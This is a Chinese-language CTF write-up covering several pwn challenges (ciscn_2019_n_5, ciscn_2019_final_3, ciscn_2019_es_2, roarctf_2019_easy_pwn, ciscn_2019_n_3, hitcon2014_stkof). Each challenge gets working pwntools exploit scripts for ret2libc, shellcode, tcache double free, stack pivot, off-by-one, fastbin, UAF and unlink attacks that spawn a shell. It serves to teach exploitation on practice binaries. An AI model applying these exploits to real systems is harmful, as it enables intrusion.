<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>,pop_rdi,elf.got[<span class="string">&#x27;read&#x27;</span>],elf.plt[<span class="string">&#x27;printf&#x27;</span>],elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">sla(<span class="string">&#x27;name?&#x27;</span>, payload)</span><br><span class="line">ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">read = uu64(r(<span class="number">6</span>))</span><br><span class="line">leak(<span class="string">&#x27;read&#x27;</span>, read)</span><br><span class="line">system, binsh = ret2libc(read, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>,pop_rdi,binsh,system,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">sla(<span class="string">&#x27;name?&#x27;</span>, payload)</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h2><p>æœ¬é¢˜æ²¡æœ‰å¼€å¯ä»»ä½•ä¿æŠ¤ï¼Œå› æ­¤æ–¹æ³•å¤šæ ·ï¼Œä¾‹å¦‚ret2libcï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;name\n&#x27;</span>, <span class="string">&#x27;merc&#x27;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x400713</span></span><br><span class="line"><span class="comment">#ret = 0x4004c9</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>,pop_rdi,elf.got[<span class="string">&#x27;read&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>],elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">ru(<span class="string">&#x27;me?\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">read = uu64(r(<span class="number">6</span>))</span><br><span class="line">leak(<span class="string">&#x27;read&#x27;</span>,read)</span><br><span class="line">sla(<span class="string">&#x27;name\n&#x27;</span>, <span class="string">&#x27;merc&#x27;</span>)</span><br><span class="line">system, binsh = ret2libc(read,<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>,pop_rdi,binsh,system,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">sla(<span class="string">&#x27;me?\n&#x27;</span>, payload)</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…æ›´ç®€å•çš„ret2shellcodeï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;name\n&#x27;</span>, asm(shellcraft.sh()))</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>,<span class="number">0x601080</span>)</span><br><span class="line">ru(<span class="string">&#x27;me?\n&#x27;</span>)</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>

<p>ç”±äºè¿œç¨‹libcç‰ˆæœ¬å’Œæœ¬åœ°äºŒè¿›åˆ¶æ–‡ä»¶çš„ç‰ˆæœ¬ä¸åŒï¼Œæ‰“è¿œç¨‹æ—¶æ¨èä½¿ç”¨ret2shellcodeï¼Œæ„Ÿè§‰è¿™ä¸ªæ›´æ¥è¿‘é¢„æœŸè§£ã€‚</p>
<h2 id="ciscn-2019-final-3"><a href="#ciscn-2019-final-3" class="headerlink" title="ciscn_2019_final_3"></a>ciscn_2019_final_3</h2><p>æä¾›äº†libcï¼Œå‘ç°æ˜¯2.27ç‰ˆæœ¬çš„ï¼Œè€ƒè™‘å’Œtcacheåˆ©ç”¨æœ‰å…³ã€‚</p>
<p>ç¨‹åºæä¾›äº†<code>add</code>å’Œ<code>remove</code>ä¸¤ä¸ªåŠŸèƒ½ï¼Œé¦–å…ˆ<code>add</code>åªèƒ½åˆ›å»ºå°äº0x78å­—èŠ‚çš„chunkï¼Œä¸”æœ€å¤šåˆ›å»º0x18ä¸ªchunkã€‚<code>gift</code>ä¼šè¿”å›åˆ†é…åˆ°çš„å†…å­˜åœ°å€ã€‚è€Œåœ¨<code>remove</code>ä¸­ï¼Œ<code>free</code>ä¹‹åæ²¡æœ‰å°†æŒ‡é’ˆç½®nullï¼Œå­˜åœ¨double freeã€‚</p>
<p>ç”±äºé¢˜ç›®ç»™äº†libcï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½æ³„éœ²libcåœ°å€ï¼Œè¿™å°±éœ€è¦tcacheä¸­æŸèŠ‚ç‚¹çš„fdæŒ‡å‘libcã€‚è€Œæˆ‘ä»¬çŸ¥é“ï¼Œunsorted binæŒ‡å‘<code>main_arena</code>çš„æŒ‡é’ˆæ˜¯æŒ‡å‘libcçš„ï¼Œé‚£ä¹ˆèƒ½ä¸èƒ½æŠŠè¿™ä¸ªæŒ‡é’ˆç»™tcacheä¸­æŸèŠ‚ç‚¹çš„fdå‘¢ï¼Ÿ</p>
<p>ç”±äº0x78å­—èŠ‚çš„é™åˆ¶æˆ‘ä»¬æ— æ³•ç›´æ¥åˆ›å»ºé€‚åˆæ”¾å…¥unsorted binä¸­çš„chunkï¼Œå› æ­¤éœ€è¦å…ˆåˆå¹¶å°å †å—ï¼Œç„¶åä¿®æ”¹<code>chunk0</code>çš„<code>chunk_size</code>æŠŠä»–å˜æˆä¸€ä¸ªå¤§å †å—ã€‚é‚£ä¹ˆå¦‚ä½•ä¿®æ”¹è¿™ä¸ª<code>chunk_size</code>å­—æ®µï¼Ÿè¿™å°±éœ€è¦ç”¨åˆ°double freeï¼Œå‡è®¾æˆ‘ä»¬è¿ç»­ç”³è¯·å †å—ç”³è¯·åˆ°äº†<code>chunk11</code>ï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk0 = add(<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">	add(<span class="number">0x78</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ³¨ï¼šç¬¬äºŒæ¬¡åˆ†é…äº†0x18å­—èŠ‚æ˜¯64ä½ä¸‹æœ€å°åˆ†é…å¤§å°ã€‚è¿™ä¸ª<code>chunk1</code>çš„åˆ†é…æ˜¯ä¸ºäº†è®©unsorted binä¸tcacheé”™ä½ã€‚</p>
</blockquote>
<p>é‚£ä¹ˆè¿™æ—¶è¿ç»­ä¸¤æ¬¡<code>free</code>æ‰<code>chunk11</code>ï¼Œå†<code>add</code>å›æ¥ï¼Œä½¿å¾—<code>chunk11-&gt;fd = chunk0-0x10</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±åœ¨<code>chunk0-0x10</code>å¤„ä¼ªé€ äº†ä¸€ä¸ªå †å—ï¼Œå†æ¬¡<code>add</code>å°±ä¼šåˆ†é…åˆ°<code>chunk0-0x10</code>ï¼Œæ­¤æ—¶å¡«å…¥å‡†å¤‡å¥½çš„<code>prev_size</code>åŠ<code>chunk_size</code>å³å¯ä¿®æ”¹<code>chunk0</code>å¤§å°ã€‚æ³¨æ„ä¸ºäº†ç¡®ä¿é‡Šæ”¾åè¿›å…¥unsorted binï¼Œ<code>chunk_size</code>éœ€å¤§äº0x400å­—èŠ‚ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">remove(<span class="number">11</span>)</span><br><span class="line">remove(<span class="number">11</span>)</span><br><span class="line">add(<span class="number">0x78</span>,p64(chunk0<span class="number">-0x10</span>)) <span class="comment"># chunk11-&gt;fd = chunk0-0x10</span></span><br><span class="line">add(<span class="number">0x78</span>,p64(chunk0<span class="number">-0x10</span>))</span><br><span class="line">add(<span class="number">0x78</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x4a1</span>))</span><br></pre></td></tr></table></figure>

<p>éšåæˆ‘ä»¬é‡Šæ”¾<code>chunk0</code>å°±ä¼šè¿›å…¥unsorted binï¼Œè€Œé‡Šæ”¾<code>chunk1</code>ä¼šè¿›å…¥<code>tcache[0]</code>ã€‚æ­¤æ—¶<code>add</code>å°±ä¼šå¾—åˆ°<code>chunk0</code>ï¼Œå¹¶ä½¿å¾—<code>chunk1-&gt;fd = main_arena</code>ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥ä¸€æ¬¡<code>add</code>å¾—åˆ°<code>chunk1</code>ï¼Œä¸‹ä¸€æ¬¡<code>add</code>å¾—åˆ°<code>main_arena</code>ï¼Œå‡å»åç§»é‡å³libcåŸºå€ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">remove(<span class="number">0</span>) <span class="comment"># unsorted bin</span></span><br><span class="line">remove(<span class="number">1</span>) <span class="comment"># tcache[0]</span></span><br><span class="line">add(<span class="number">0x78</span>) <span class="comment"># chunk0; chunk1-&gt;fd = main_arena</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># chunk1</span></span><br><span class="line">main_arena = add(<span class="number">0x18</span>)</span><br><span class="line">base = main_arena - <span class="number">0x3ebca0</span></span><br><span class="line">leak(<span class="string">&#x27;base&#x27;</span>, base)</span><br></pre></td></tr></table></figure>

<p>æœ€åå†æ¬¡åˆ©ç”¨double freeï¼Œç”¨<code>one_gadget</code>è¦†ç›–<code>free_hook</code>ï¼Œå†æ¬¡è°ƒç”¨<code>remove</code>å³å¯ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">free_hook = base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">one_gadget = base + <span class="number">0x10a38c</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line">remove(<span class="number">18</span>)</span><br><span class="line">remove(<span class="number">18</span>)</span><br><span class="line">add(<span class="number">0x28</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0x28</span>, p64(free_hook))</span><br><span class="line">add(<span class="number">0x28</span>, p64(one_gadget))</span><br><span class="line">remove(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>åªèƒ½æº¢å‡º8å­—èŠ‚ï¼Œç©ºé—´å¤ªå°ï¼Œå› æ­¤è€ƒè™‘æ ˆè¿ç§»ã€‚å¦‚ä¸‹å¸ƒç½®æ ˆï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ret addr</span><br><span class="line">ebp-0x2c</span><br><span class="line">padding</span><br><span class="line">&#x2F;sh\x00</span><br><span class="line">&#x2F;bin</span><br><span class="line">ebp-0x1c</span><br><span class="line">padding</span><br><span class="line">system</span><br><span class="line">padding</span><br><span class="line">ebp-0x24</span><br><span class="line">padding</span><br><span class="line">padding</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sa(<span class="string">&#x27;name?\n&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">ru(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">ebp = uu32(r(<span class="number">4</span>))</span><br><span class="line">leak(<span class="string">&#x27;ebp&#x27;</span>, ebp)</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,ebp<span class="number">-0x24</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,elf.plt[<span class="string">&#x27;system&#x27;</span>],<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,ebp<span class="number">-0x1c</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,ebp<span class="number">-0x2c</span>)</span><br><span class="line">s(payload)</span><br></pre></td></tr></table></figure>

<h2 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h2><p>æœ¬é¢˜åœ¨<code>write</code>æ—¶å­˜åœ¨off_by_oneæ¼æ´ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_E26</span><span class="params">(<span class="keyword">signed</span> <span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)a2 )</span><br><span class="line">    <span class="keyword">return</span> a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )</span><br><span class="line">    LODWORD(result) = a1 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    LODWORD(result) = a1;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœç¼–è¾‘æ—¶è¾“å…¥çš„<code>size</code>æ¯”åˆ›å»ºæ—¶çš„<code>size</code>å¤§10ï¼Œå°±å¯ä»¥å¤šè¾“å…¥ä¸€ä¸ªå­—èŠ‚ã€‚è¿™å¤šå‡ºæ¥çš„ä¸€ä¸ªå­—èŠ‚å¯ä»¥è¦†ç›–åˆ°ä¸‹ä¸€ä¸ªchunkçš„<code>chunk_size</code>å­—æ®µï¼Œä»è€Œä¿®æ”¹å…¶å¤§å°ï¼Œé€ æˆå †å—é‡å ã€‚</p>
<p>é¦–å…ˆè¿ç»­åˆ›å»º5ä¸ª<code>chunk</code>ï¼Œå…¶ä¸­ç¬¬0ä¸ªçš„å¤§å°å¿…é¡»ä»¥<code>8</code>ç»“å°¾ï¼Œå¦åˆ™åªèƒ½æº¢å‡ºåˆ°<code>prev_size</code>è€Œä¸æ˜¯<code>chunk_size</code>ã€‚ç¼–è¾‘0ä¸­æ•°æ®ï¼Œè§¦å‘off_by_oneæ¡ä»¶æº¢å‡ºä¿®æ”¹1çš„å¤§å°ã€‚éšå<code>free(1)</code>ä½¿å…¶å¯¹åº”å¤§å°çš„chunkè¿›å…¥unsorted binï¼Œæ­¤æ—¶2çš„fdå³æŒ‡å‘<code>main_arena+88</code>ï¼Œä»è€Œå¯ä»¥æ³„éœ²libcã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x58</span>) <span class="comment"># 0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	add(<span class="number">0x60</span>) <span class="comment"># 1</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x58</span>+<span class="number">10</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span>+<span class="string">&#x27;\xe1&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 1</span></span><br><span class="line">show(<span class="number">2</span>) <span class="comment"># 2</span></span><br><span class="line">ru(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">main_arena = uu64(r(<span class="number">6</span>)) - <span class="number">88</span></span><br><span class="line">base = main_arena - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br><span class="line">leak(<span class="string">&#x27;base&#x27;</span>, base)</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å…ˆç»•è¿‡fastbinçš„å¤§å°æ£€æŸ¥ï¼Œéšåå‘fdå†™å…¥<code>malloc_hook</code>ä¸Šæ–¹çš„åœ°å€åç”³è¯·å›æ¥ï¼Œä»ç”³è¯·åˆ°çš„åœ°å€å‡ºå‘å¡«å……11å­—èŠ‚åå³å¯ç”¨<code>one_gadget</code>è¦†ç›–<code>__malloc_hook</code>ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯<code>one_gadget</code>çš„çº¦æŸæ¡ä»¶å¾—ä¸åˆ°æ»¡è¶³ï¼Œå› æ­¤éœ€è¦å…ˆæ‰§è¡Œ<code>__libc_realloc</code>å¯¹rspè¿›è¡Œè°ƒæ•´ã€‚æœ€åç”¨<code>one_gadget</code>è¦†ç›–<code>__realloc_hook</code>ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 5 (2)</span></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment"># bypass fastbin check</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x8</span>,p64(main_arena<span class="number">-0x33</span>)) <span class="comment"># above malloc_hook</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment"># 6</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0xb</span>,base+<span class="number">0x4526a</span>,base+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>æœ¬é¢˜<code>do_new</code>å‡½æ•°å…ˆåˆ›å»º<code>0xc</code>çš„chunkï¼ŒåŒ…å«å¡«å……çš„æ•°å­—ã€å¯¹æ•°å­—çš„æ‰“å°å‡½æ•°å’Œé‡Šæ”¾å‡½æ•°ï¼›è€Œå¦‚æœç”³è¯·çš„æ˜¯<code>string</code>ç±»å‹ï¼Œä¸”é•¿åº¦ä¸è¶…è¿‡<code>0x400</code>çš„è¯ï¼Œéšåè¿˜ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„chunkï¼ŒåŒ…å«å­—ç¬¦ä¸²å†…å®¹ã€å¯¹å­—ç¬¦ä¸²çš„æ‰“å°å‡½æ•°å’Œé‡Šæ”¾å‡½æ•°ã€‚</p>
<p>è€Œåœ¨<code>do_del</code>ä¸­ï¼Œ<code>free</code>åæ²¡æœ‰æ¸…ç©ºæŒ‡é’ˆï¼Œå­˜åœ¨uafã€‚å› æ­¤å¯ä»¥å…ˆç”³è¯·ä¸¤ä¸ªå †å—ï¼ˆæ€»å¤§å°å¤§äº<code>0xc</code>ï¼‰ç„¶åä¾æ¬¡é‡Šæ”¾ï¼Œå†ç”³è¯·ä¸€ä¸ªå¤§å°ä¸º<code>0xc</code>çš„å †å—ã€‚é‚£ä¹ˆæ­¤æ—¶å…ˆä¼šæ‹¿å‡º<code>chunk1</code>çš„<code>0xc</code>è¿™ä¸€å—ï¼Œå†æ‹¿å‡º<code>chunk0</code>çš„<code>0xc</code>è¿™ä¸€å—ï¼Œåè€…æ˜¯æˆ‘ä»¬å¯å†™çš„ã€‚</p>
<p>é€šè¿‡é€†å‘å¯çŸ¥ç»“æ„ä½“åç§»0å¤„æ˜¯æ‰“å°å‡½æ•°ã€åç§»4å¤„æ˜¯é‡Šæ”¾å‡½æ•°ï¼Œé‡Šæ”¾å‡½æ•°çš„å‚æ•°æ˜¯ç»“æ„ä½“æŒ‡é’ˆæœ¬èº«ã€‚é‚£ä¹ˆæˆ‘ä»¬å°†<code>chunk0</code>çš„æ‰“å°å‡½æ•°å†™æˆ<code>sh\x00\x00</code>ï¼ˆæ³¨æ„4å­—èŠ‚ï¼‰ï¼Œé‡Šæ”¾å‡½æ•°ç”¨<code>system</code>è¦†ç›–ï¼Œé‡Šæ”¾æ—¶å°±ä¼šæ‰§è¡Œ<code>system(&quot;sh&quot;)</code>ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,<span class="built_in">len</span>,content=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	sla(<span class="string">&#x27;Type &gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Length &gt; &#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">	sla(<span class="string">&#x27;Value &gt; &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;CNote &gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Index &gt; &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xc</span>,<span class="string">&#x27;sh\x00\x00&#x27;</span>+p32(elf.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="comment"># 0xc from 1, then 0xc from 0</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<h2 id="hitcon2014-stkof"><a href="#hitcon2014-stkof" class="headerlink" title="hitcon2014_stkof"></a>hitcon2014_stkof</h2><p>æœ¬é¢˜å…±å››ä¸ªåŠŸèƒ½ï¼šæ·»åŠ ã€è¯»å…¥å†…å®¹ã€åˆ é™¤ã€æ˜¾ç¤ºã€‚å…¶ä¸­è¯»å…¥å†…å®¹å­˜åœ¨å †æº¢å‡ºï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæº¢å‡ºå®ç°unlinkæ”»å‡»ã€‚ç¨‹åºä¸­å­˜åœ¨å…¨å±€æ•°ç»„<code>bag</code>ï¼Œå­˜æ”¾æ‰€æœ‰chunkçš„memæŒ‡é’ˆã€‚</p>
<p>å…ˆç”³è¯·3ä¸ªchunkï¼Œå…¶ä¸­ç¬¬1ä¸ªchunkæ²¡æœ‰ç”¨ï¼Œåªæ˜¯å› ä¸ºå‰ä¸¤ä¸ªchunkä¸è¿ç»­æ‰€ä»¥æ‰ç”³è¯·çš„ã€‚éšåé€šè¿‡chunk2æº¢å‡ºåˆ°chunk3è¿›è¡Œunlinkæ”»å‡»ï¼Œè¿™æ ·ä¿®æ”¹<code>bag[2]</code>ç­‰ä»·äºä¿®æ”¹<code>bag[-1]</code>ï¼Œå¡«å……æ‰<code>bag[-1]</code>å’Œ<code>bag[0]</code>åï¼Œä»¤ï¼š</p>
<ul>
<li><code>bag[1] = elf.got[&#39;free&#39;]</code></li>
<li><code>bag[2] = elf.got[&#39;fflush&#39;]</code>ï¼Œ<code>fflush</code>å¯ä»¥æ˜¯ä»»æ„å·²è°ƒç”¨çš„libcå‡½æ•°</li>
<li><code>bag[3] = elf.got[&#39;atoi&#39;]</code></li>
</ul>
<p>æ­¤æ—¶æˆ‘ä»¬<code>edit(1)</code>å†™å…¥<code>elf.plt[&#39;puts&#39;]</code>å³å¯åŠ«æŒ<code>free</code>å‡½æ•°åˆ°<code>puts</code>ï¼Œé‚£ä¹ˆè°ƒç”¨<code>delete(2)</code>å°±ä¼šæ‰“å°å‡º<code>fflush</code>åœ°å€ï¼Œä»è€Œæ³„éœ²libcã€‚æœ€å<code>edit(3)</code>å†™å…¥<code>system</code>åœ°å€ï¼ŒåŠ«æŒ<code>atoi</code>åˆ°<code>system</code>ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ç¨‹åºè¯»å…¥æŒ‡ä»¤æ—¶ä¼šè°ƒç”¨<code>atoi(&amp;nptr)</code>ï¼Œæˆ‘ä»¬è¾“å…¥çš„<code>nptr</code>åªéœ€è¦æ˜¯<code>/bin/sh</code>å³å¯getshellã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">	sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(size))</span><br><span class="line">	ru(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	sl(<span class="built_in">str</span>(index))</span><br><span class="line">	sl(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">	s(content)</span><br><span class="line">	ru(<span class="string">&#x27;OK\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bag = <span class="number">0x602140</span></span><br><span class="line"></span><br><span class="line">add(<span 